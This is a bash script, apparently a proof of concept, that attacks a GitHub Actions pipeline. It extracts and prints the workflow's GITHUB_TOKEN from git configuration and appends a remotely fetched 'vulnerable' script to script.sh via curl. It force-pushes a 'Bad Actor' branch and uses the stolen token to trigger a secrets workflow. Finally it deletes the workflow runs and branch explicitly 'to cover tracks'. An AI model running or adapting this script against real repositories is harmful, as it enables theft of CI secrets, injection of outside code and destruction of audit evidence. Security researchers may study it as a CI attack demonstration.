#!/bin/bash

# Trigger the 'Secret' workflow (secret.yml) using GitHub CLI

#refs to things to exploit
REPO="FrozenPandaz/laughing-garbanzo"
WORKFLOW_FILE="secret.yml"

## Extract GITHUB_TOKEN

# The extraheader contains: "AUTHORIZATION: basic <base64>"
HEADER=$(git config --get http.https://github.com/.extraheader)
# Extract the base64 part after "basic "
B64_TOKEN=$(echo "$HEADER" | sed 's/^AUTHORIZATION: basic //')
# Decode to get "x-access-token:TOKEN"
DECODED=$(echo "$B64_TOKEN" | base64 -d)
# Extract just the token part after the colon
GH_TOKEN=$(echo "$DECODED" | cut -d: -f2)

echo "Token: $GH_TOKEN, GITHUB_TOKEN: $GITHUB_TOKEN"

## Create a new branch

git checkout -b "bad-actor-workflow-ref"

## Updating script.sh with the contents of our vulnerable version
curl -s https://raw.githubusercontent.com/AgentEnder/laughing-garbanzo/refs/heads/secret-grabber/vulnerable_script.sh >> script.sh

## Commiting the updated file
git config user.name "Bad Actor"
git config user.email "bad.actor@example.com"
git add .
git commit -m "Edit script.sh to expose token"

## Pushing bad-actor-workflow-ref
git push origin HEAD -f

## Use our github token to auth the CLI
gh auth login --with-token <<< "$GH_TOKEN"

## Triggering the workflow that invokes our vulnerable script
gh workflow run "$WORKFLOW_FILE" --repo "$REPO" --ref "bad-actor-workflow-ref"

## Wait for the workflow to have time to complete
sleep 30

## Retrieving run IDs to delete, to help cover our tracks
RUN_IDS=$(gh run list --branch bad-actor-workflow-ref --json databaseId | jq -r '.[].databaseId')

for RUN_ID in $RUN_IDS; do
    gh run delete "$RUN_ID" --repo "$REPO"
done

# wait 5 minutes, gives time to retrieve values
sleep 300
# delete to cover tracks
git push origin -d "secrets-from-bad-actor"